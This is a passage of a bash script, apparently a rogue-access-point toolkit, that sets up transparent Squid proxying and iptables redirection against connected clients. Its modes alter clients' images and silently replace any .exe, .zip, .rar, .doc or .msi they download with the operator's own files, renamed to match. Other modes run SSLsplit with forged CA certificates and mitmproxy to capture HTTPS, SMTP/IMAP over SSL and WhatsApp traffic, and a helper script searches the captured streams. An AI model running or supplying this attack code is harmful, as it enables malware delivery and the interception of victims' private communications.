$baseDir = "/var/www/images";           # Needs be writable by 'nobody'
$baseURL = "http://".$ourIP."/images";  # Location on websever
$convert = "/usr/bin/convert";          # Path to convert
$identify = "/usr/bin/identify";        # Path to identify
$jp2a = "/usr/bin/jp2a";                # Path to jp2a

$|=1;
$asciify = 0;
$count = 0;
$pid = $$;

if ($debug == 1) { open (DEBUG, '>>/tmp/asciiImages_debug.log'); }
autoflush DEBUG 1;

print DEBUG "########################################################################\n";
print DEBUG strftime ("%d%b%Y-%H:%M:%S\t Server: $baseURL/\n",localtime(time()));
print DEBUG "########################################################################\n";
system("killall convert");
while (<>) {
   chomp $_;
   if ($_ =~ /(.*\.(gif|png|bmp|tiff|ico|jpg|jpeg))/i) {                         # Image format(s)
      $url = $1;                                                                 # Get URL
      if ($debug == 1) { print DEBUG "Input: $url\n"; }                          # Let the user know

      $file = "$baseDir/$pid-$count";                                            # Set filename + path
      $filename = "$pid-$count";                                                 # Set filename

      getstore($url,$file);                                                      # Save image
      system("chmod", "a+r", "$file");                                        # Allow access to the file
      if ($debug == 1) { print DEBUG "Fetched image: $file\n"; }                 # Let the user know

      $asciify = 1;                                                              # We need to do something with the image
   }
   else {                                                                        # Everything not a image
      print "$_\n";                                                              # Just let it go
      if ($debug == 1) { print DEBUG "Pass: $_\n"; }                             # Let the user know
   }

   if ($asciify == 1) {                                                          # Do we need to do something?
      if ($_ !=~ /(.*\.(jpg|jpeg))/i) {                                          # Select everything other image type to jpg
         system("$convert", "$file", "$file.jpg");                               # Convert images so they are all jpgs for jp2a
         #system("rm", "$file");                                                 # Remove originals
         if ($debug == 1) { print DEBUG "Converted to jpg: $file.jpg\n"; }       # Let the user know
      }
      else {
         system("mv", "$file", "$file.jpg");
      }
      system("chmod", "a+r", "$file.jpg");                                       # Allow access to the file

      $size = `$identify $file.jpg | cut -d" " -f 3`;
      chomp $size;
      if ($debug == 1) { print DEBUG "Image size: $size ($file)\n"; }

      system("$jp2a $file.jpg --invert | $convert -font Courier-Bold label:\@- -size $size $file-ascii.png");   # PNGs are smaller than jpg
      #system("rm $file.jpg");
      system("chmod", "a+r", "$file-ascii.png");
      if ($debug == 1) { print DEBUG "Asciify: $file-ascii.png\n"; }

      print "$baseURL/$filename-ascii.png\n";
      if ($debug == 1) { print DEBUG "Output: $baseURL/$filename-ascii.png, From: $url\n"; }
   }
   $asciify = 0;
   $count++;
}

close (DEBUG);
EOF

# Make it executable
chmod 755 /usr/local/bin/redirect.pl

# Make dir /images/ in /var/www/ and if exist erase it's contents
if [ ! -d /var/www/images ];then
	mkdir /var/www/images
	chown -R www-data:www-data /var/www
	chmod -R 1777 /var/www
	usermod -aG proxy www-data
else
	rm -r -f /var/www/images/*
fi


# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
if [  ! -d /var/www/sarg-realtime  ];then
	mkdir /var/www/sarg-realtime
	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
	chown -R www-data:www-data /var/www
	chmod -R 1777 /var/www
	usermod -aG proxy www-data
fi

# Activate our redirect script in squid3.conf
# url_rewrite_program /usr/local/bin/redirect.pl
# redirect_children 
# Remove "#"
sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
sed 's%#redirect_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf

# Start apache2 so it can serve real time reports from SARG to our localhost.
/etc/init.d/apache2 start
$cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"

if [ -n "`pidof squid3`" ];then
	squid3 -k reconfigure
	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
else
	/etc/init.d/squid3 restart
	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
fi

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP
#Transparent Squid3
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.60.129:3128
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 3128

# Start Sarg. Create real time reports
sleep 3
$necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
sarg -r > /dev/null &
$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
$cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"

echo
$cecho "Your clients are now Transparently HTTP Proxied "$RED"BUT"$END" their browser's images will converted into ASCII art."
$cecho ""$RED"To take affect, don't forget to clean up your clients browser's cache."$END""
$cecho "To see a more detailed but static (not real time) report about who-when is connected and what was visited,"
$cecho "top sites, sites & users please type in a console "$RED"'" sarg -x -z "'"$END"." 
$cecho "Then go to $HOME_DIR/squid-reports and open index.html."
$cecho "Only "$GREEN"http sites"$END" will get affected. The script has no affect to "$RED"https sites"$END"."
$cecho ""$BLUE"https://code.google.com/p/g0tmi1k/source/browse/trunk#trunk%2FsquidScripts"$END""
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 			Mode "Tourette" :Client's browser images will be added by words				#
#		https://code.google.com/p/g0tmi1k/source/browse/trunk/squidScripts/touretteImages.pl		#
#					g0tmilk's redirect script						#
#################################################################################################################
if [ "$WLNMODE" = "Tourtt_Imgs" ];then

# Create our redirect script
cat > /usr/local/bin/redirect.pl << "EOF"
#!/usr/bin/perl
########################################################################
# touretteImages.pl       --- Squid Script (Add words to images)       #
# g0tmi1k 2011-03-25      --- Original Idea: http://prank-o-matic.com  #
########################################################################
# *Could go "crazy"-do more than one word? "Flash" it? Limited images?*#
########################################################################
use IO::Handle;
use LWP::Simple;
use POSIX strftime;

$debug = 0;                               # Debug mode - create log file
@words = ('Kali','Linux','$friendly_name','Nick_the_Greek','Kali Linux','prank-o-matic','g0tmi1k');   # Use theses words at random...
$ourIP = "127.0.0.1";                     # Our IP address
$baseDir = "/var/www/images";             # Needs be writable by 'nobody'
$baseURL = "http://".$ourIP."/images";    # Location on websever
$convert = "/usr/bin/convert";            # Path to convert
$identify = "/usr/bin/identify";          # Path to identify

$|=1;
$animate = 0;
$count = 0;
$pid = $$;
$word = $words[int rand($#words + 1)];

if ($debug == 1) { open (DEBUG, '>>/tmp/touretteImages_debug.log'); }
autoflush DEBUG 1;

print DEBUG "########################################################################\n";
print DEBUG strftime ("%d%b%Y-%H:%M:%S\t Server: $baseURL/\n",localtime(time()));
print DEBUG "########################################################################\n";
system("killall convert");
while (<>) {
   chomp $_;
   if ($_ =~ /(.*\.(gif|png|bmp|tiff|ico|jpg|jpeg))/i) {                         # Image format(s)
      $url = $1;                                                                 # Get URL
      if ($debug == 1) { print DEBUG "Input: $url\n"; }                          # Let the user know

      $file = "$baseDir/$pid-$count";                                            # Set filename + path
      $filename = "$pid-$count";                                                 # Set filename

      getstore($url,$file);                                                      # Save image
      system("chmod", "a+r", "$file");                                           # Allow access to the file
      if ($debug == 1) { print DEBUG "Fetched image: $file\n"; }                 # Let the user know

      $animate = 1;                                                              # We need to do something with the image
   }
   else {                                                                        # Everything not a image
      print "$_\n";                                                              # Just let it go
      if ($debug == 1) { print DEBUG "Pass: $_\n"; }                             # Let the user know
   }

   if ($animate == 1) {
      if ($_ !=~ /(.*\.gif)/i) {                                                 # Select everything other image type to jpg
         system("$convert", "$file", "$file.gif");                               # Convert images so they are all jpgs for jp2a
         #system("rm", "$file");                                                 # Remove originals
         if ($debug == 1) { print DEBUG "Converted to gif: $file.gif\n"; }       # Let the user know
      }
      else {
         system("mv", "$file", "$file.gif");                                     # No need to convert!
      }
      system("chmod", "a+r", "$file.gif");                                       # Allow access to the file

      $size = `$identify $file.gif | cut -d" " -f 3`;
      chomp $size;
      if ($debug == 1) { print DEBUG "Image size: $size ($file)\n";}

      system("$convert -background black -fill white -gravity center -size $size label:'$word' $file-text.gif");
      system("chmod", "a+r", "$file-text.gif");
      if ($debug == 1) { print DEBUG "Turette image: $file-text.gif\n"; }

      system("$convert -delay 100 -size $size -page +0+0 $file.gif -page +0+0 $file-text.gif -loop 0 $file-animation.gif");
      system("chmod", "a+r", "$file-animation.gif");
      #system("rm $file.gif $file-text.gif");
      if ($debug == 1) { print DEBUG "Animated gif: $url\n"; }

      print "$baseURL/$filename-animation.gif\n";
      if ($debug == 1) { print DEBUG "Output: $baseURL/$filename-animation.gif, From: $url\n"; }
   }
   $animate = 0;
   $count++;
}
EOF

# Make it executable
chmod 755 /usr/local/bin/redirect.pl

# Make dir /images/ in /var/www/ and if exist erase it's contents
if [ ! -d /var/www/images ];then
	mkdir /var/www/images
	chown -R www-data:www-data /var/www
	chmod -R 1777 /var/www
	usermod -aG proxy www-data;else
	rm -r -f /var/www/images/*
fi

# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
if [  ! -d /var/www/sarg-realtime  ];then
	mkdir /var/www/sarg-realtime
	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
	chown -R www-data:www-data /var/www
	chmod -R 1777 /var/www
	usermod -aG proxy www-data
fi

# Activate our redirect script in squid3.conf
# url_rewrite_program /usr/local/bin/redirect.pl
# redirect_children 
sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
sed 's%#redirect_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf

# Start apache2 so it can serve real time reports from SARG to our localhost.
/etc/init.d/apache2 start
$cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"

if [ -n "`pidof squid3`" ];then
	squid3 -k reconfigure
	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
else
	/etc/init.d/squid3 restart
	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
fi

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP

#Transparent Squid3
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.60.129:3128
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 3128

# Start Sarg. Create real time reports
sleep 3
$necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
sarg -r > /dev/null &
$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
$cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"

echo
$cecho "Your clients are now Transparently HTTP Proxied "$RED"BUT"$END" their browser's images will be added by words."
$cecho ""$RED"To take affect, don't forget to clean up your clients browser's cache."$END""
$cecho "To see a more detailed but static (not real time) report about who-when is connected and what was visited,"
$cecho "top sites, sites & users please type in a console "$RED"'" sarg -x -z "'"$END"." 
$cecho "Then go to $HOME_DIR/squid-reports and open index.html."
$cecho "Only "$GREEN"http sites"$END" will get affected. The script has no affect to "$RED"https sites"$END"."
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# Mode Forced download :Client's will be forced to download our test.exe or test.zip or test.rar or test.doc 	#
# or test.msi when they asked to download ANY file from ANY site and that file match the above extension, 	#
# 		*.exe *.zip *.rar *.doc *.msi. The downloaded file name will be the original.			#
#################################################################################################################
if [ "$WLNMODE" = "Forced_download" ];then

# Make /bad_files/ folder in $HOME_DIR
if [ ! -d $HOME_DIR/bad_files ];then
mkdir $HOME_DIR/bad_files
fi

# If test.exe test.zip test.rar test.doc doesn't exist there, then create them (empty files)
if [ ! -f $HOME_DIR/bad_files/test.exe ] || [ ! -f $HOME_DIR/bad_files/test.zip ] || [ ! -f $HOME_DIR/bad_files/test.rar ] || [ ! -f $HOME_DIR/bad_files/test.doc ] || [ ! -f $HOME_DIR/bad_files/test.msi ];then
cat /dev/null > $HOME_DIR/bad_files/test.exe
cat /dev/null > $HOME_DIR/bad_files/test.zip
cat /dev/null > $HOME_DIR/bad_files/test.rar
cat /dev/null > $HOME_DIR/bad_files/test.doc
cat /dev/null > $HOME_DIR/bad_files/test.msi
fi

# Create our redirect script
cat > /usr/local/bin/redirect.pl << "EOF"
#!/usr/bin/perl
$|=1;
$count = 0;
$pid = $$;
while (<>) {
        chomp $_;
        if ($_ =~ /(.*\.exe)/i) {
                $url = $1;
                system("/bin/cp", "$HOME_DIR/bad_files/test.exe","/var/www/files/$pid-$count.exe");
                print "http://127.0.0.1/files/$pid-$count.exe\n";
        }
        elsif ($_ =~ /(.*\.rar)/i) {
                $url = $1;
                system("/bin/cp", "$HOME_DIR/bad_files/test.rar","/var/www/files/$pid-$count.rar");
                print "http://127.0.0.1/files/$pid-$count.rar\n";

        }
        elsif ($_ =~ /(.*\.zip)/i) {
                $url = $1;
                system("/bin/cp", "$HOME_DIR/bad_files/test.zip","/var/www/files/$pid-$count.zip");
                print "http://127.0.0.1/files/$pid-$count.zip\n";

        }
        elsif ($_ =~ /(.*\.doc)/i) {
                $url = $1;
                system("/bin/cp", "$HOME_DIR/bad_files/test.doc","/var/www/files/$pid-$count.doc");
                print "http://127.0.0.1/files/$pid-$count.doc\n";

        }
	elsif ($_ =~ /(.*\.msi)/i) {
                $url = $1;
                system("/bin/cp", "$HOME_DIR/bad_files/test.msi","/var/www/files/$pid-$count.msi");
                print "http://127.0.0.1/files/$pid-$count.msi\n";
        }
        else {
                print "$_\n";;
        }
        $count++;
}
EOF

#Replace $HOME_DIR with "$HOME_DIR" :-)
# See above cat.... "EOF"
sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.exe","/var/www/files/$pid-$count.exe");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.exe","/var/www/files/$pid-$count.exe");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.rar","/var/www/files/$pid-$count.rar");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.rar","/var/www/files/$pid-$count.rar");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.zip","/var/www/files/$pid-$count.zip");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.zip","/var/www/files/$pid-$count.zip");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.doc","/var/www/files/$pid-$count.doc");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.doc","/var/www/files/$pid-$count.doc");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.msi","/var/www/files/$pid-$count.msi");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.msi","/var/www/files/$pid-$count.msi");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl

# Make it executable
chmod 755 /usr/local/bin/redirect.pl

# Make dir /files/ in /var/www/ and if exist erase it's contents
if [ ! -d /var/www/files ];then
	mkdir /var/www/files
	chown -R www-data:www-data /var/www
	chmod -R 1777 /var/www
	usermod -aG proxy www-data;else
	rm -r -f /var/www/files/*
fi

# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
if [  ! -d /var/www/sarg-realtime  ];then
	mkdir /var/www/sarg-realtime
	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
	chown -R www-data:www-data /var/www
	chmod -R 1777 /var/www
	usermod -aG proxy www-data
fi

# Activate our redirect script in squid3.conf
# url_rewrite_program /usr/local/bin/redirect.pl
# redirect_children 
sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
sed 's%#redirect_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf

# Start apache2 so it can serve real time reports from SARG to our localhost.
/etc/init.d/apache2 start
$cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"

if [ -n "`pidof squid3`" ];then
	squid3 -k reconfigure
	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
else
	/etc/init.d/squid3 restart
	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
fi

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP

#Transparent Squid3
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.60.129:3128
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 3128

# Start Sarg. Create real time reports
sleep 3
$necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
sarg -r > /dev/null &
$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
$cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
echo
echo "At this point you may want to replace (all or some of them)"
echo "the following zero-byte files with your files:"
echo "$HOME_DIR/bad_files/test.exe"
echo "$HOME_DIR/bad_files/test.zip"
echo "$HOME_DIR/bad_files/test.rar"
echo "$HOME_DIR/bad_files/test.doc"
echo "$HOME_DIR/bad_files/test.msi"
echo "Don't forget to keep the same filenames e.g. test.exe, test.zip etc."
echo
$cecho "Your clients are now Transparently HTTP Proxied "$RED"BUT"$END" they will be forced to"
$cecho "download our test.(exe, zip, rar, doc, msi) when they asked to download ANY file from ANY HTTP site"
$cecho "and that file matches the above extension, *.exe *.zip *.rar *.doc *.msi."
$cecho "Then our box will rename our test.* to the original filename and will serve it back"
$cecho "Only "$GREEN"http sites"$END" will get affected. The script has no affect to "$RED"https sites"$END"."
echo
$cecho "To see a more detailed but static (not real time) report about who-when is connected and what was visited,"
$cecho "top sites, sites & users please type in a console "$RED"'" sarg -x -z "'"$END"." 
$cecho "Then go to $HOME_DIR/squid-reports and open index.html."
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 		Mode: SSLsplit (Clients can access Internet - Transparently SSLsplited)				#
# 	SSLsplit is a generic transparent TLS/SSL proxy for performing man-in-the-middle attacks 		#
# 			on all kinds of secure communication protocols. 					#
# Using SSLsplit, you can intercept and save SSL-based traffic and thereby listen in on any secure connection.	#
#				http://www.roe.ch/SSLsplit							#
#				https://github.com/droe/sslsplit						#
#################################################################################################################

if [ "$WLNMODE" = "SSLsplit" ];then

# Let's create our directory for SSLsplt(if it doesn't exist). $HOME_DIR/sslsplit/
# The content of the connections is written to the $HOME_DIR/sslsplit/logdir/
# If folders exist erase it's contents
if [ ! -d $HOME_DIR/sslsplit/ ];then
	mkdir $HOME_DIR/sslsplit/
	mkdir $HOME_DIR/sslsplit/logdir/
else
	rm -r -f $HOME_DIR/sslsplit/logdir/*
	rm -r -f $HOME_DIR/sslsplit/*
	mkdir $HOME_DIR/sslsplit/logdir/
fi

#Create a search script in $HOME_DIR/sslsplit/search.sh
# It's a little bit hard to search without it.
export string='$string'
cat > $HOME_DIR/sslsplit/search.sh << EOF
export dir="$HOME_DIR/sslsplit/logdir"
while :
	do
	echo
	echo "Searching in: $HOME_DIR/sslsplit/logdir"
	echo -n "Enter the string to search (q for quit):"
	read string
		case $string in
			[qQ])
				echo "Quit..."
				exit 1
	                ;;
			"")
				echo "BLANK input. Nothing to search"
				read -p 'Press ENTER to continue...' string;echo
			;;
			*)
				# print: -n line number,  -x force PATTERN to match only whole lines, -H print the filename for each match
				# --binary-files=text assume that binary files are text, --color=auto use markers to highlight the matching strings
				find $dir -type f -exec grep -n -H --binary-files=text --color=auto $string {} \; -print
			;;
		esac
done
EOF
chmod +x $HOME_DIR/sslsplit/search.sh

# Start SSLsplit: Drop privileges to user root, -D debug mode: run in foreground, log debug messages on stderr, runs in foreground, no daemon, verbose output) 
# -Z disable SSL/TLS compression on all connections, -l outputs connection attempts in the log file connections.log.
# The actual content of the connections is written to the $HOME_DIR/sslsplit/logdir/
# -j and -S — each incoming/outgoing TCP stream of each connection in a separate file.
# -k use CA key $friendly_name-ca.key to sign forged certs
# -c use CA cert $friendly_name-ca.crt to sign forged certs
# ssl/4 on address $INETIP (Internet gateway) port 8443 and tcp/4 on address $INETIP (Internet gateway) port 8080
$necho "[....] Starting SSLsplit."
xterm -geometry 160x40-0+0 -e "sslsplit -u root -Z -O -l $HOME_DIR/sslsplit/connections.log -j $HOME_DIR/sslsplit/ -S logdir/ -k $HOME_DIR/CA-certificates/$friendly_name-ca.key -c $HOME_DIR/CA-certificates/$friendly_name-ca.crt ssl $INETIP 8443 tcp $INETIP 8080"&
# Debug.
#xterm -geometry 160x40-0+0 -e "sslsplit -u root -D -Z -O -l $HOME_DIR/sslsplit/connections.log -j $HOME_DIR/sslsplit/ -S logdir/ -k $HOME_DIR/CA-certificates/$friendly_name-ca.key -c $HOME_DIR/CA-certificates/$friendly_name-ca.crt ssl $INETIP 8443 tcp $INETIP 8080"&

$cecho "\r[ "$GREEN"ok"$END" ] Starting SSLsplit."

# iptables DNS to our inet addr. 
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP

# Plain text traffic on ports: [HTTP (80) - WhatsApp (5222)] are redirected to port 8080.
# Packets for SSL-based traffic on ports: HTTPS (443), SMTP over SSL (465 and 587) ,IMAP over SSL (993) are redirected to port 8443.
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp -m multiport --dports 80,5222 -j DNAT --to-destination $INETIP:8080
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp -m multiport --dports 443,587,465,993 -j DNAT --to-destination $INETIP:8443
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp -m multiport --dports 80,5222 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp -m multiport --dports 443,587,465,993 -j REDIRECT --to-ports 8443
echo
$cecho "Your clients can now surf the web and we Transparently sniffing:"
$cecho "non-SSL traffic  : "$GREEN"HTTP, WhatsApp"$END" and"
$cecho "SSL-based traffic: "$GREEN"HTTPS, SMTP over SSL and IMAP over SSL"$END""
echo "You may want to check:"
$cecho ""$GREEN"$HOME_DIR/sslsplit/connections.log  "$END":Outputs connection attempts"
$cecho ""$GREEN"$HOME_DIR/sslsplit/logdir/          "$END":Each incoming/outgoing TCP stream of each connection in separate files"
$cecho ""$GREEN"$HOME_DIR/sslsplit/logdir/search.sh "$END":A search script. Will do queries in the above /logdir/ folder/files"
$cecho "Don't forget to install the appropriate* CA certificate into the browser or operating system of your client(s)."
$cecho "*Please refer to :"$GREEN"$HOME_DIR//CA-certificates/README"$END" file"
$cecho "*Installing a personal CA certificate for Firefox,OSX,Windows 7,iPhone/iPad, IOS Simulator,Android:"
$cecho ""$BLUE"http://mitmproxy.org/doc/ssl.html"$END""

#$cecho ""$GREEN"How to distribute root certificates as exe files"$END""
#$cecho ""$BLUE"http://poweradmin.se/blog/2010/01/23/how-to-distribute-root-certificates-as-exe-files/"$END""
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 						Mode: MiTMproxy							#
# 	An interactive console program that allows traffic flows to be inspected and edited on the fly.		#
# http://mitmproxy.org/												#
# http://blog.philippheckel.com/2013/07/01/how-to-use-mitmproxy-to-read-and-modify-https-traffic-of-your-phone/	#
# https://gotofail.com/												#
# http://corte.si/posts/security/gotofail-mitmproxy.html							#
# https://github.com/mitmproxy/mitmproxy									#
# Honey proxy http://0x32202.tumblr.com/post/54181737556							#
#################################################################################################################
if [ "$WLNMODE" = "MiTMproxy" ];then

# Let's create our directory for MiTMproxy (if it doesn't exist). $HOME_DIR/mitmproxy/
if [ ! -d $HOME_DIR/mitmproxy/ ];then
	mkdir $HOME_DIR/mitmproxy/
else 
	# Clean the log file
	cat /dev/null > $HOME_DIR/mitmproxy/mitmproxy.log
fi

# For some weird reason Mitmproxy and Honeyproxy doesn't like CA-Certs with a different filename other than
# mitmproxy-ca-cert.pem and other location that /root/.mitmproxy/.
# Create symbolic links to our certificates. We will not use mitmproxy's certificates
if [ ! -d /root/.mitmproxy/ ];then
	mkdir /root/.mitmproxy
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca.pem /root/.mitmproxy/mitmproxy-ca.pem
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.crt /root/.mitmproxy/mitmproxy-ca-cert.cer
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.p12 /root/.mitmproxy/mitmproxy-ca-cert.p12
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.pem /root/.mitmproxy/mitmproxy-ca-cert.pem
else
	rm -r -f /root/.mitmproxy/
	mkdir /root/.mitmproxy
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca.pem /root/.mitmproxy/mitmproxy-ca.pem
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.crt /root/.mitmproxy/mitmproxy-ca-cert.cer
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.p12 /root/.mitmproxy/mitmproxy-ca-cert.p12
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.pem /root/.mitmproxy/mitmproxy-ca-cert.pem
fi

# Start MiTMproxy in debug mode - log file $HOME_DIR/mitmproxy/mitmproxy.log - in transparent proxy mode
# Try to convince servers to send us un-compressed data - Set color palette to solarized dark, proxy service port 8080
# Configuration directory=$HOME_DIR/mitmproxy/
# User-created SSL certificate file=$HOME_DIR/CA-certificates/$friendly_name-ca.pem and client certificate directory=$HOME_DIR/CA-certificates/
# mitmproxy doesn't like certificate to be in other location than /root/.mitmproxy/ folder.

$necho "[....] Starting MiTMproxy."
#xterm -geometry 160x40-0+0 -e "mitmproxy --debug -w $HOME_DIR/mitmproxy/mitmproxy.log -T -z --palette=dark -p 8080 --confdir=$HOME_DIR/mitmproxy/.mitmproxy --cert=$HOME_DIR/CA-certificates/$friendly_name-ca.pem --client-certs=$HOME_DIR/mitmproxy/.mitmproxy"&
xterm -geometry 160x40-0+0 -e "mitmproxy --debug -w $HOME_DIR/mitmproxy/mitmproxy.log -T -z --palette=dark -p 8080"&
$cecho "\r[ "$GREEN"ok"$END" ] Starting MiTMproxy."

# iptables DNS to our inet addr. 
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP

# Plain text traffic on ports: [HTTP (80) are redirected to port 8080.
# Packets for SSL-based traffic on ports: HTTPS (443) are redirected to port 8080.
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp -m multiport --dports 80,443 -j DNAT --to-destination $INETIP:8080
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp -m multiport --dports 80,443 -j REDIRECT --to-ports 8080

echo
$cecho "Your clients can now surf the web and we Transparently sniffing:"
$cecho "non-SSL traffic  : "$GREEN"HTTP"$END" and"
